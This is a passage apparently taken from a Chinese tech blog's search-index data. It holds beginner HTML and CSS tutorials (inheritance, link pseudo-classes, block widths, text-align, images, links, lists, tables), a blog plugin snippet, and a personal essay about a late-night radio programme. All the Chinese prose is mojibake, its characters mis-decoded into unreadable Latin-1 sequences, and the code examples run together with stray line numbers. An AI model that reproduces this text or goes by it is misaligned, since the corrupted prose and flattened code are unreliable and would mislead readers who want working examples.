color: green; font-size: 50px; text-align: center; } &lt;/style&gt;&lt;/head&gt;&lt;body&gt; &lt;div class="div"&gt;æˆ‘æ˜¯div&lt;/div&gt;&lt;/body&gt;&lt;/html&gt; ä¸Šè¿°ä»£ç ï¼Œåœ¨æµè§ˆå™¨è¿è¡Œçš„æ•ˆæœå¦‚ä¸‹ï¼š CSS ç»§æ‰¿æ€§ æ ‡ç­¾å¯ä»¥ç»§æ‰¿çˆ¶å…ƒç´ å…³äºæ–‡æœ¬è®¾ç½®çš„å±æ€§ï¼ˆä¸åŒ…æ‹¬ widthã€height ç­‰å±æ€§ï¼‰ï¼Œç»§æ‰¿çš„æƒé‡æ˜¯æœ€ä½çš„ï¼ˆç­‰ä»·äº 0ï¼‰ &lt;a&gt; æ ‡ç­¾é»˜è®¤è®¾ç½®äº† colorã€cursor ç­‰å±æ€§ï¼Œç»§æ‰¿å¾—åˆ°çš„é¢œè‰²ä¼šè¢« &lt;a&gt; æ ‡ç­¾è‡ªèº«çš„å±æ€§å±‚å ï¼ˆè¦†ç›–ï¼‰ 1234567891011121314151617181920212223242526&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;meta charset="utf-8"&gt; &lt;title&gt;CSS çš„ç»§æ‰¿æ€§&lt;/title&gt; &lt;style text="text/css"&gt; .box { color: red; font-size: 30px; width: 300px; height: 300px; background-color: pink; } p { color: blue; } &lt;/style&gt;&lt;/head&gt;&lt;body&gt; &lt;div class="box"&gt; &lt;span&gt;Css&lt;/span&gt; &lt;i&gt;Html&lt;/i&gt; &lt;p&gt;JavaScript&lt;/p&gt; &lt;/div&gt;&lt;/body&gt;&lt;/html&gt; ä¸Šè¿°ä»£ç ï¼Œåœ¨æµè§ˆå™¨è¿è¡Œçš„æ•ˆæœå¦‚ä¸‹ï¼š çŠ¶æ€ä¼ªç±» çŠ¶æ€ä¼ªç±»ï¼šæƒé‡æ˜¯ 10ï¼Œå½“å››ä¸ªçŠ¶æ€åŒæ—¶å­˜åœ¨æ—¶ï¼Œè¦éµå¾ª lvha é¡ºåº 12345678910111213141516171819202122232425262728293031&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;meta charset="utf-8"&gt; &lt;title&gt;çŠ¶æ€ä¼ªç±»&lt;/title&gt; &lt;style type="text/css"&gt; a { font-size: 20px; } /* è¶…é“¾æ¥æœªç‚¹å‡» */ a:link { color: orange; } /* è¶…é“¾æ¥å·²ç‚¹å‡» */ a:visited { color: gray; } /* è¶…é“¾æ¥è·å–ç„¦ç‚¹ */ a:hover { color: black; } /* è¶…é“¾æ¥è¢«ç‚¹å‡» */ a:active { color: blue; } &lt;/style&gt;&lt;/head&gt;&lt;body&gt; &lt;a href="##"&gt;è¶…é“¾æ¥&lt;/a&gt;&lt;/body&gt;&lt;/html&gt; 1234567891011121314151617181920&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;meta charset="utf-8"&gt; &lt;title&gt;å¸¸ç”¨çš„ä¸¤ç§çŠ¶æ€ä¼ªç±»&lt;/title&gt; &lt;style type="text/css"&gt; .baidu { color: blue; font-size: 20px; } .baidu:hover { color: orange; } &lt;/style&gt;&lt;/head&gt;&lt;body&gt; &lt;a href="https://www.baidu.com" class="baidu"&gt;è¶…é“¾æ¥&lt;/a&gt; &lt;a href="##"&gt;è¶…é“¾æ¥&lt;/a&gt;&lt;/body&gt;&lt;/html&gt; å—å…ƒç´ é»˜è®¤å®½åº¦å—å…ƒç´ åœ¨ä¸è®¾ç½®å›ºå®šå®½åº¦æ—¶ï¼Œå…¶é»˜è®¤çš„å®½åº¦å’Œçˆ¶å…ƒç´ çš„å®½åº¦ä¸€æ ·ï¼Œé€‚ç”¨äºå—å…ƒç´ æ ‡ç­¾ï¼š&lt;html&gt;ã€&lt;body&gt;ã€&lt;div&gt;ã€&lt;h1&gt; - &lt;h6&gt;ã€&lt;p&gt;ã€&lt;ul&gt;ã€&lt;ol&gt;ã€&lt;li&gt;ã€&lt;dl&gt;ã€&lt;dt&gt;ã€&lt;dd&gt;ã€&lt;hr&gt;ã€&lt;form&gt;ã€‚ 1234567891011121314151617181920212223&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;meta charset="utf=8"&gt; &lt;title&gt;å—å…ƒç´ é»˜è®¤å®½åº¦&lt;/title&gt; &lt;style type="text/css"&gt; .one { width: 200px; height: 200px; background-color: red; } .two { height: 100px; background-color: blue; } &lt;/style&gt;&lt;/head&gt;&lt;body&gt; &lt;div class="one"&gt; &lt;div class="two"&gt;&lt;/div&gt; &lt;/div&gt;&lt;/body&gt;&lt;/html&gt; ä¸Šè¿°ä»£ç ï¼Œåœ¨æµè§ˆå™¨è¿è¡Œçš„æ•ˆæœå¦‚ä¸‹ï¼š text-aligin æ°´å¹³å±…ä¸­ text-align èƒ½è®©æ ‡ç­¾å†…çš„æ–‡æœ¬ã€è¡Œå†…å…ƒç´ ã€è¡Œå†…å—å…ƒç´ æ°´å¹³å±…ä¸­ï¼Œä½†ä¸èƒ½è®©æ ‡ç­¾å†…çš„å—å…ƒç´ æ°´å¹³å±…ä¸­ è‹¥å¸Œæœ›è®©æ–‡æœ¬ã€è¡Œå†…å…ƒç´ ã€è¡Œå†…å—å…ƒç´ æ°´å¹³å±…ä¸­ï¼Œåˆ™éœ€è¦ç»™å®ƒä»¬çš„çˆ¶å…ƒç´ è®¾ç½®ä¸€å®šçš„å®½åº¦ 12345678910111213141516171819202122232425262728293031323334353637&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;meta charset="utf8"&gt; &lt;title&gt;text-align èƒ½è®©ä»€ä¹ˆæ°´å¹³å±…ä¸­æ˜¾ç¤º&lt;/title&gt; &lt;style type="text/css"&gt; h1 { background-color: pink; text-align: center; width: 500px; } img { width: 50px; height: 50px; } .box { width: 300px; height: 300px; text-align: center; background-color: yellow; } .one { width: 100px; height: 100px; background-color: blue; } &lt;/style&gt;&lt;/head&gt;&lt;body&gt; &lt;h1&gt;æ ‡é¢˜&lt;/h1&gt; &lt;div class="box"&gt; &lt;b&gt;æˆ‘æ˜¯ Box&lt;/b&gt; &lt;img src="https://dss2.bdstatic.com/lfoZeXSm1A5BphGlnYG/skin/29.jpg" /&gt; &lt;div class="one"&gt;&lt;/div&gt; &lt;/div&gt;&lt;/body&gt;&lt;/html&gt; ä¸Šè¿°ä»£ç ï¼Œåœ¨æµè§ˆå™¨è¿è¡Œçš„æ•ˆæœå¦‚ä¸‹ï¼š var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "å…¨æ ˆæŠ€æœ¯é©¿ç«™", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "type": "hexo", "random": "0.9", "interval": "30", "expires": "365", "height": "auto" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"å‰ç«¯"},{title:"ç”µå° FM91.4 - æ˜Ÿç©ºå¤œè¯",url:"/posts/7263da5.html",text:'æœ€æ–°å…¬å‘Š ç”µå°èŠ‚ç›®ã€Šæ˜Ÿç©ºå¤œè¯ã€‹ äº 2021 å¹´ 2 æœˆæ­£å¼æ¢å¤æ’­å‡ºï¼Œä¸»æŒäººæ˜¯é»„çº¬ï¼Œç”µå°æ”¶å¬é¢‘æ®µä¾æ—§æ˜¯ 91.4ï¼ˆä»…é™å¹¿æ·±ä½›ï¼‰ï¼Œæ’­å‡ºæ—¶æ®µæ˜¯ 22:30 - 00:00ï¼ˆå‘¨ä¸€ï½å‘¨äº”ï¼‰ã€‚ åºè¨€ å¶ç„¶çš„æƒ…å†µä¸‹åœ¨è±†ç“£ä¸Šçœ‹åˆ°äº†æ–‡ç«  - æˆ‘å¾ˆæƒ³å¿µã€Šæ˜Ÿç©ºå¤œè¯ã€‹ï¼Œè·Ÿä½œè€…ä¸€æ ·ä¹Ÿæ˜¯ã€Šæ˜Ÿç©ºå¤œè¯ã€‹çš„å¿ å®å¬ä¼—ï¼Œäºæ˜¯æœ‰äº†ä»¥ä¸‹çš„ç¢ç¢å¿µã€‚ èŠ‚ç›®å†å² ã€Šæ˜Ÿç©ºå¤œè¯ã€‹æ˜¯å¹¿ä¸œæ–°é—»å¹¿æ’­æ¨å‡ºçš„æ·±å¤œæƒ…æ„Ÿç”µå°èŠ‚ç›®ï¼Œç”µå°æ”¶å¬é¢‘æ®µæ˜¯ 91.4ï¼ˆä»…é™å¹¿æ·±ä½›ï¼‰ï¼Œæ’­å‡ºæ—¶æ®µæ˜¯ 22:15 - 00:00ï¼ˆå‘¨ä¸€ï½å‘¨äº”ï¼‰ã€‚è¿™æ¡£èŠ‚ç›®æœ€åˆçš„åç§°æ˜¯ã€Šè°ˆæƒ…è°ˆåˆ°åäºŒç‚¹ã€‹ï¼Œè€Œã€Šè°ˆæƒ…è°ˆåˆ°åäºŒç‚¹ã€‹çš„å‰èº«æ˜¯åˆé—´ç‰ˆçš„ã€Šç”·ç”Ÿå¥³ç”Ÿé…ã€‹ã€‚æœ€åˆçš„èŠ‚ç›®ä¸»æŒäººæ˜¯å•å›¡å›¡ï¼Œåæ¥èŠ‚ç›®æ”¹ç‰ˆäº†ï¼Œå•å›¡å›¡å’Œå­™æ½‡æ¯…å¼€å§‹æ­æ¡£ä¸»æŒèŠ‚ç›®ï¼Œè®°å¿†çŠ¹æ–°çš„æ˜¯èŠ‚ç›®æ”¹ç‰ˆåï¼Œç‰‡å¤´çš„é‚£å¥ â€œæˆ‘ä»¬æ€»æœ‰æ•…äº‹å‘ç”Ÿâ€ã€‚å¿˜äº†è¿‡äº†å¤šä¹…ï¼Œå­™æ½‡æ¯…åæ¥ç¦»å¼€äº†ã€Šæ˜Ÿç©ºå¤œè¯ã€‹ï¼Œè½¬å»åšéŸ³ä¹ç”µå°ï¼Œç„¶åå°±å†ä¹Ÿæ²¡åœ¨ã€Šæ˜Ÿç©ºå¤œè¯ã€‹é‡Œå‡ºç°è¿‡äº†ã€‚åæ¥ç”·ä¸»æ’­é»„çº¬åŠ å…¥ã€Šæ˜Ÿç©ºå¤œè¯ã€‹ï¼Œä¸å•å›¡å›¡è½®æµä¸»æŒèŠ‚ç›®ã€‚å¯æƒœå•å›¡å›¡åœ¨ 2015.03.21 ä¸»æŒå®Œæœ€åä¸€æœŸèŠ‚ç›®åä¹Ÿç¦»å¼€äº†ã€Šæ˜Ÿç©ºå¤œè¯ã€‹ï¼Œè½¬å»åšåˆé—´èŠ‚ç›®ã€Šå¾®åšå¤§è§†é‡ã€‹ï¼Œåˆšå¥½é‚£æ®µæ—¶é—´å•å›¡å›¡ç»“å©šäº†ï¼ˆä¸‰ä¸ªæœˆé—ªå©šï¼‰ï¼Œè®°å¾—æœ€åé‚£æœŸï¼ˆ2015.03.21ï¼‰èŠ‚ç›®çš„ä¸»é¢˜æ˜¯ã€Šä»¥æœ€éª„å‚²çš„å§¿æ€ç¦»å¼€ã€‹ã€‚æœ€åï¼Œã€Šæ˜Ÿç©ºå¤œè¯ã€‹å°±å‰©ä¸‹é»„çº¬åœ¨ç»§ç»­ä¸»æŒèŠ‚ç›®äº†ã€‚ åœ¨çº¿æ”¶å¬ è‹¥å¸Œæœ›åœ¨çº¿æ”¶å¬ã€Šæ˜Ÿç©ºå¤œè¯ã€‹çš„å†å²èŠ‚ç›®æˆ–è€…æœ€æ–°èŠ‚ç›®ï¼Œæ‰‹æœºå¯ä»¥ä¸‹è½½å®‰è£… APP èœ»èœ“ FMï¼Œç„¶ååœ¨ APP å†…æœç´¢ "æ˜Ÿç©ºå¤œè¯" å³å¯ã€‚å¦‚æœå–œæ¬¢ä¸»æ’­é»„çº¬çš„å£°éŸ³ï¼Œè¿˜å¯ä»¥åœ¨ èœ»èœ“ FM ä¸Šæ”¶å¬èŠ‚ç›® ã€Šéšé£æ½œå…¥å¤œã€‹ï¼Œæˆ–è€…å…³æ³¨ä¸»æ’­çš„å¾®ä¿¡å…¬ä¼—å· fm0424ã€‚ æ˜Ÿç©ºè®°å¿† è®°å¾—ç¬¬ä¸€æ¬¡æ”¶å¬ã€Šæ˜Ÿç©ºå¤œè¯ã€‹æ˜¯åœ¨è¯»åˆäºŒçš„æ—¶å€™ï¼Œè·ä»Šå¤§æ¦‚ä¹Ÿæœ‰ 15 å¹´äº†ï¼›åœ¨é‚£ä¸ªå°‘æœ‰ MP3ã€æ‰‹æœºçš„å­¦ç”Ÿæ—¶ä»£ï¼Œç”¨çš„æ˜¯ä¾¿æºå¼æ”¶éŸ³æœºæ”¶å¬ã€‚é‚£æ—¶å€™æ¯”è¾ƒæ‡µæ‡‚ï¼Œä¹Ÿä¸çŸ¥é“ä¸ºä»€ä¹ˆåæ¥å°±æ…¢æ…¢å–œæ¬¢ä¸Šäº†è¿™æ¡£ç”µå°èŠ‚ç›®ï¼Œå°¤å…¶å–œæ¬¢èŠ‚ç›®ä¸»æŒäººå•å›¡å›¡çš„å£°éŸ³ã€‚åˆä¸­åˆ°é«˜ä¸­ä¸€ç›´éƒ½åœ¨å¬ï¼Œä¸è¿‡è¯»å¤§å­¦å’Œå·¥ä½œåæ”¶å¬çš„é¢‘ç‡å°±ä½äº†å¾ˆå¤šï¼Œåªæ˜¯å¶å°”åœ¨å¤±çœ æˆ–è€…æƒ…ç»ªä½è½çš„æ—¶å€™æ‰ä¼šå¬ä¸€ä¸‹ã€‚ åšå®¢è¯´æ˜ åœ¨ PC ç«¯è®¿é—®å½“å‰åšå®¢æ—¶ï¼Œç½‘é¡µå·¦ä¸‹è§’çš„éŸ³ä¹æ’­æ”¾å™¨åˆ—è¡¨é‡Œä¼šæœ‰ã€Šæ˜Ÿç©ºå¤œè¯ã€‹çš„èŠ‚ç›®ï¼ŒéŸ³é¢‘æ¥æºäº èœ»èœ“ FMï¼ŒèŠ‚ç›®æ’­å‡ºæ—¥æœŸæ˜¯ä» 2014.09.24 åˆ° 2017.03.29ï¼Œæ¯æ¬¡åˆ·æ–°é¡µé¢éƒ½ä¼šä» 477 æœŸçš„èŠ‚ç›®ä¸­éšæœºæŠ½å–è‹¥å¹²æœŸèŠ‚ç›®ï¼Œè¿™ç®—æ˜¯å¯¹ã€Šæ˜Ÿç©ºå¤œè¯ã€‹çš„ä¸€ç§çºªå¿µã€‚ç”±äºéŸ³é¢‘çš„ç‰ˆæƒåŸå› ï¼Œæ­¤åŠŸèƒ½æš‚æ—¶åœç”¨ã€‚ å®£ä¼ å›¾ç‰‡ é™„ä¸Šã€Šæ˜Ÿç©ºå¤œè¯ã€‹çš„å®£ä¼ å›¾ç‰‡ å¾®ä¿¡ç¾¤ æ—¥åå¸Œæœ›æœ‰æœºä¼šå»ºä¸€ä¸ªã€Šæ˜Ÿç©ºå¤œè¯ã€‹çš„å¾®ä¿¡ç¾¤ï¼Œè‹¥å¬å‹æ„Ÿå…´è¶£å¯ä»¥æ‰«æä¸‹æ–¹çš„å¾®ä¿¡ç¾¤äºŒç»´ç ï¼ŒåŠ å…¥åˆ°ç¾¤é‡Œå’Œå°ä¼™ä¼´ä»¬ä¸€èµ·åˆ†äº«è‡ªå·±çš„æ˜Ÿç©ºç»å†ã€‚ç”±äºå¾®ä¿¡ç¾¤äºŒç»´ç å­˜åœ¨æœ‰æ•ˆæœŸï¼Œè‹¥è¿‡æœŸäº†ä½ å¯ä»¥åœ¨ä¸‹æ–¹çš„è¯„è®ºåŒºç•™è¨€ï¼Œå»ºè®®ç•™è¨€çš„æ—¶å€™åœ¨é‚®ç®±çš„è¾“å…¥æ¡†å†…å¡«å†™ä½ çš„é‚®ç®±åœ°å€ï¼Œç¬”è€…ä¼šé€šè¿‡é‚®ä»¶è”ç³»ä½ å¹¶é‚€è¯·ä½ åŠ å…¥æ˜Ÿç©ºå¤œè¯çš„å¾®ä¿¡ç¾¤ã€‚å› ä¸ºåœ¨ä¸‹æ–¹è¯„è®ºåŒºç•™è¨€åï¼Œè¯„è®ºåŒºé»˜è®¤æ˜¯ä¸ä¼šæ˜¾ç¤ºä½ çš„é‚®ç®±åœ°å€ï¼Œåªæœ‰ç¬”è€…èƒ½åœ¨åå°çœ‹åˆ°ï¼Œæ‰€ä»¥ä½ ä¸ç”¨æ‹…å¿ƒä¸ªäººéšç§æ³„æ¼çš„é—®é¢˜ã€‚',tags:"ç”Ÿæ´»éšç¬”"},{title:"å‰ç«¯å…¥é—¨åŸºç¡€ä¹‹ HTML ä¸ CSS ä¹‹ä¸€",url:"/posts/838fe3ef.html",text:'å‰è¨€Web æ ‡å‡†Web æ ‡å‡†æ˜¯ç”± W3Cï¼ˆä¸‡ç»´ç½‘è”ç›Ÿç»„ç»‡ï¼‰ç»„ç»‡åˆ¶å®šï¼ŒåŒ…æ‹¬ä»¥ä¸‹ä¸‰éƒ¨åˆ†ï¼š ç»“æ„: HTML è¡¨ç°: CSS è¡Œä¸º: JavaScript æµè§ˆå™¨å†…æ ¸ IE: trident å†…æ ¸ Firefox: gecko å†…æ ¸ Opear: webkit å†…æ ¸ Safari: webkit å†…æ ¸ Chrome: blink å†…æ ¸ï¼Œå±äº webkit å†…æ ¸çš„ä¸€ä¸ªåˆ†æ”¯ HTML å‘å±•å² æç¤º HTML5 æ˜¯ä¸€ä¸ªæ–°çš„ HTML ç‰ˆæœ¬ï¼Œæ–°å¢äº†ä¸€äº›æ ‡ç­¾å’ŒåŠŸèƒ½ï¼Œé€‚ç”¨äºé«˜çº§æµè§ˆå™¨ã€‚H5 å¼€å‘æ˜¯ä¸€ä¸ªæ³›æŒ‡ï¼ŒæŒ‡çš„å°±æ˜¯ç§»åŠ¨ç«¯é¡µé¢å¼€å‘çš„æ„æ€ã€‚ HTML åŸºç¡€HTML æ ‡ç­¾æ ‡ç­¾çš„ç±»å‹ å•æ ‡ç­¾ï¼šè‡ªç»“æŸæ ‡ç­¾ï¼Œä¾‹å¦‚: &lt;meta&gt; åŒæ ‡ç­¾ï¼šæœ‰å¼€å§‹æœ‰é—­åˆçš„æ ‡ç­¾ï¼Œä¾‹å¦‚ï¼š&lt;html&gt;&lt;/html&gt; æ ‡ç­¾çš„å…³ç³» å¹¶åˆ—å…³ç³»ï¼šåŒçº§å…³ç³»ï¼Œæ˜¯å…„å¼Ÿä¹‹é—´çš„å…³ç³» åµŒå¥—å…³ç³»ï¼šåŒ…å«å…³ç³»ï¼Œæ˜¯ç¥–å…ˆå’Œåä»£ä¹‹é—´çš„å…³ç³» åŸºæœ¬æ ‡ç­¾ &lt;!DOCTYPE html&gt;ï¼šæ–‡æ¡£ç±»å‹çš„å£°æ˜ï¼Œè®©æµè§ˆå™¨æŒ‰ç…§ç›¸åº”ç‰ˆæœ¬çš„ HTML è¿›è¡Œè§£æ &lt;html&gt;ï¼šç½‘é¡µçš„æ ¹æ ‡ç­¾ï¼Œæ‰€æœ‰å…¶å®ƒçš„æ ‡ç­¾éƒ½è¢«åŒ…å«åœ¨é‡Œé¢ &lt;head&gt;ï¼šå¤´éƒ¨æ ‡ç­¾ï¼Œå…³äºç½‘é¡µçš„ä¸€äº›é…ç½®ä¿¡æ¯ &lt;meta charset="utf-8"&gt;ï¼šå­—ç¬¦é›†è®¾ç½®æˆ–è€…å«ç¼–ç è®¾ç½®ï¼Œå„ç§å­—ç¬¦é›†ç¼–ç çš„è¯´æ˜å¯çœ‹è¿™é‡Œ å¸¸ç”¨æ ‡ç­¾ &lt;p&gt;ï¼šæ®µè½æ ‡ç­¾ &lt;br&gt;ï¼šæ¢è¡Œæ ‡ç­¾ &lt;hr&gt;ï¼šæ°´å¹³çº¿æ ‡ç­¾ &lt;h1&gt; - &lt;h6&gt;ï¼šæ ‡é¢˜æ ‡ç­¾ &lt;i&gt;ã€&lt;em&gt;ï¼šå€¾æ–œæ ‡ç­¾ &lt;s&gt;ã€&lt;del&gt;ï¼šåˆ é™¤æ ‡ç­¾ &lt;u&gt;ã€&lt;ins&gt;ï¼šä¸‹åˆ’çº¿æ ‡ç­¾ &lt;b&gt;ã€&lt;strong&gt;ï¼šåŠ ç²—æ ‡ç­¾ æç¤º æ ‡ç­¾åŸºæœ¬éƒ½å…·å¤‡ä¸€å®šçš„è¯­ä¹‰ï¼Œçˆ¬è™«å¼•æ“ä¼šæ ¹æ®æ ‡ç­¾è¯­ä¹‰æ¥è·å–æ–‡æœ¬ä¿¡æ¯ &lt;em&gt;ã€&lt;del&gt;ã€&lt;ins&gt;ã€&lt;strong&gt; è¿™äº›æ ‡ç­¾ï¼Œé™¤äº†å…·å¤‡æ˜¾ç¤ºæ•ˆæœä¹‹å¤–ï¼Œæ›´å¼ºè°ƒè¯­ä¹‰ å›¾ç‰‡æ ‡ç­¾ æ’å…¥å›¾ç‰‡å’Œè®¾ç½®èƒŒæ™¯å›¾çš„åŒºåˆ« æ’å…¥å›¾ç‰‡æ˜¯ä½¿ç”¨ &lt;img&gt; æ ‡ç­¾ï¼Œæ ‡ç­¾åœ¨ç½‘é¡µä¸­æ˜¯å ä½ç½®çš„ï¼Œè€Œè®¾ç½®èƒŒæ™¯å›¾æ˜¯é å±æ€§ backgroundã€‚ç”±äºå±æ€§æ˜¯ä¸å ä½ç½®çš„ï¼Œå¯ä»¥ç®€å•è®¤ä¸ºèƒŒæ™¯å›¾å°±æ˜¯ä¸€ä¸ªä¸°å¯Œå¤šå½©çš„èƒŒæ™¯é¢œè‰²ï¼ŒèƒŒæ™¯å›¾çš„å°ºå¯¸ä¸æ ‡ç­¾çš„å°ºå¯¸æ— å…³ã€‚ 123456789&lt;!DOCTYPE html&gt;&lt;html&gt; &lt;head&gt; &lt;meta charset="utf-8"&gt; &lt;title&gt;èƒŒæ™¯å›¾&lt;/title&gt; &lt;/head&gt; &lt;body style="background: url(https://dss2.bdstatic.com/lfoZeXSm1A5BphGlnYG/skin/29.jpg) no-repeat; background-size: 100% 100%; background-attachment: fixed;"&gt; &lt;/body&gt;&lt;/html&gt; å›¾ç‰‡ä¸å­˜åœ¨æ—¶æ˜¾ç¤ºé»˜è®¤å›¾ç‰‡ å½“å›¾ç‰‡åŠ è½½å¤±è´¥æ—¶ï¼Œå¯ä»¥é€šè¿‡ onerror å±æ€§æŒ‡å®šé»˜è®¤æ˜¾ç¤ºçš„å›¾ç‰‡ï¼Œä½¿ç”¨ç¤ºä¾‹å¦‚ä¸‹ï¼š 1&lt;img src="https://www.example.cn/img/head.jpg" onerror="javascript:this.src=\'https://qiniu.example.cn/gif/loading.gif\'" &gt; æˆ–è€…æŒ‡å®šé»˜è®¤çš„ Base64 å›¾ç‰‡ï¼š 1&lt;img src="https://www.example.cn/img/head.jpg" onerror="javascript:this.src=\'data:image/gif;base64,R0lGODlhDAEMAfcBMQAAAADXXXXXXXXXXXXXXXXXXXXX\'"&gt; è·¯å¾„ç»å¯¹è·¯å¾„æç¤º è·¯å¾„æ˜¯æŒ‡ç½‘é¡µå’Œå…¶ä»–æ–‡ä»¶çš„ä½ç½®å…³ç³»ï¼Œå‡ºäºå®‰å…¨è€ƒè™‘ï¼Œæµè§ˆå™¨ä¸å…è®¸ç›´æ¥é€šè¿‡ç»å¯¹è·¯å¾„è®¿é—®æœ¬åœ°ç£ç›˜ä¸­çš„æ–‡ä»¶ã€‚ ç›¸å¯¹è·¯å¾„åŒçº§ç›¸å¯¹è·¯å¾„1&lt;img src="phone.jpg"&gt; ä¸‹çº§ç›¸å¯¹è·¯å¾„ é“¾æ¥è¶…é“¾æ¥ ç©ºé“¾æ¥å½“æ²¡æœ‰æƒ³å¥½é“¾æ¥è·³è½¬åˆ°å“ªä¸ªç½‘é¡µæ—¶ï¼Œåˆ™å¯ä»¥è®¾ç½®æˆç©ºé“¾æ¥ã€‚ç©ºé“¾æ¥å†™ä¸€ä¸ª # æ—¶ï¼Œç‚¹å‡»åä¼šè¿”å›é¡¶éƒ¨ï¼Œé€šå¸¸ä¼šå†™ä¸¤ä¸ª ##ã€‚ 1&lt;a href="##"&gt; é”šç‚¹é“¾æ¥åœ¨ç½‘é¡µå†…éƒ¨è¿›è¡Œè·³è½¬ï¼Œéœ€è¦ç»™ç›®æ ‡é“¾æ¥æ ‡ç­¾è®¾ç½® id å±æ€§ã€‚å¯ä»¥é€šè¿‡ &lt;a&gt; æ ‡ç­¾ä¸­çš„ href å±æ€§ï¼Œä½¿ç”¨ #id æ¥å…³è” id å±æ€§çš„å€¼ã€‚ 123456789101112131415161718&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;meta charset="utf-8"&gt; &lt;title&gt;é”šç‚¹é“¾æ¥&lt;/title&gt;&lt;/head&gt;&lt;body&gt; &lt;p&gt;æ®µè½&lt;/p&gt; &lt;p&gt;æ®µè½&lt;/p&gt; &lt;font color="blue" id="level1"&gt;ç¬¬ä¸€å±‚&lt;/font&gt; &lt;p&gt;æ®µè½&lt;/p&gt; &lt;p&gt;æ®µè½&lt;/p&gt; &lt;font color="blue" id="level2"&gt;ç¬¬äºŒå±‚&lt;/font&gt; &lt;p&gt;æ®µè½&lt;/p&gt; &lt;p&gt;æ®µè½&lt;/p&gt; &lt;a href="#level1"&gt;è·³è½¬ç¬¬ä¸€å±‚&lt;/a&gt;&lt;/body&gt;&lt;/html&gt; åˆ—è¡¨æ— åºåˆ—è¡¨123456789101112131415&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;meta charset="utf-8"&gt; &lt;title&gt;åˆ—è¡¨&lt;/title&gt;&lt;/head&gt;&lt;body&gt; &lt;h3&gt;æ— åºåˆ—è¡¨&lt;/h3&gt; &lt;ul&gt; &lt;li&gt;å•†å“ä¸€&lt;/li&gt; &lt;li&gt;å•†å“äºŒ&lt;/li&gt; &lt;li&gt;å•†å“äºŒ&lt;/li&gt; &lt;/ul&gt;&lt;/body&gt;&lt;/html&gt; æœ‰åºåˆ—è¡¨123456789101112131415&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;meta charset="utf-8"&gt; &lt;title&gt;åˆ—è¡¨&lt;/title&gt;&lt;/head&gt;&lt;body&gt; &lt;h3&gt;æœ‰åºåˆ—è¡¨&lt;/h3&gt; &lt;ol&gt; &lt;li&gt;å•†å“ä¸€&lt;/li&gt; &lt;li&gt;å•†å“äºŒ&lt;/li&gt; &lt;li&gt;å•†å“äºŒ&lt;/li&gt; &lt;/ol&gt;&lt;/body&gt;&lt;/html&gt; è‡ªå®šä¹‰åˆ—è¡¨è‡ªå®šä¹‰åˆ—è¡¨æ˜¯è¢«ä¸€ç»„ dl ç®¡ç†çš„åˆ—è¡¨ï¼Œdt æ˜¯ä¸»é¢˜ï¼Œdd æ˜¯åˆ—è¡¨é¡¹ã€‚å…¶ä¸­ dl åªèƒ½åŒ…å« dt å’Œ ddï¼Œè€Œ dt å’Œ dd å¯ä»¥åŒ…å«å…¶ä»–æ ‡ç­¾ã€‚ 12345678910111213141516&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;meta charset="utf-8"&gt; &lt;title&gt;åˆ—è¡¨&lt;/title&gt;&lt;/head&gt;&lt;body&gt; &lt;h3&gt;è‡ªå®šä¹‰åˆ—è¡¨&lt;/h3&gt; &lt;dl&gt; &lt;dt&gt;äºšæ´²&lt;/dt&gt; &lt;dd&gt;ä¸­å›½&lt;/dd&gt; &lt;dd&gt;æ—¥æœ¬&lt;/dd&gt; &lt;dd&gt;éŸ©å›½&lt;/dd&gt; &lt;/dl&gt;&lt;/body&gt;&lt;/html&gt; è¡¨æ ¼è¡¨æ ¼åŸºç¡€ æ ‡ç­¾ tableï¼šè¡¨æ ¼æ ‡ç­¾ trï¼šè¡Œæ ‡ç­¾ thï¼šè¡¨å¤´æ ‡ç­¾ï¼Œå†…å®¹æ°´å¹³å±…ä¸­ä¸”åŠ ç²—çš„ tdï¼šå•å…ƒæ ¼æ ‡ç­¾ï¼Œåˆ—é»˜è®¤æ˜¯ä»¥å½“å‰åˆ—ä¸­æœ€å®½çš„ä¸ºåŸºå‡† captionï¼šè¡¨æ ¼æ ‡é¢˜ å±æ€§ widthï¼šå®½åº¦ heightï¼šé«˜åº¦ borderï¼šè¾¹æ¡†å®½åº¦ cellspacingï¼šå•å…ƒæ ¼ä¸å•å…ƒæ ¼ä¹‹é—´çš„é—´è· alignï¼šæ–‡æœ¬çš„å¯¹é½æ–¹å¼ï¼šleft / å±…å·¦ã€center / å±…ä¸­ã€right / å±…å³ colspan: è·¨åˆ—åˆå¹¶å•å…ƒæ ¼ rowspan: è·¨è¡Œåˆå¹¶å•å…ƒæ ¼ è¡¨æ ¼å®æˆ˜é€šè¿‡ table æ ‡ç­¾å®ç°è¯¾ç¨‹è¡¨ï¼ˆå¦‚ä¸‹æ‰€ç¤ºï¼‰ï¼š â˜…å±•å¼€æ¡ˆä¾‹ä»£ç â˜… 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;meta charset="utf-8"&gt; &lt;title&gt;è¯¾ç¨‹è¡¨&lt;/title&gt;&lt;/head&gt;&lt;body&gt; &lt;table border="1px" width="800px" height="300px" cellspacing="0"&gt; &lt;caption&gt; &lt;h2&gt;è¯¾ç¨‹è¡¨&lt;/h2&gt; &lt;/caption&gt; &lt;tr align="center" bgcolor="red"&gt; &lt;th&gt;é¡¹ç›®&lt;/th&gt; &lt;th 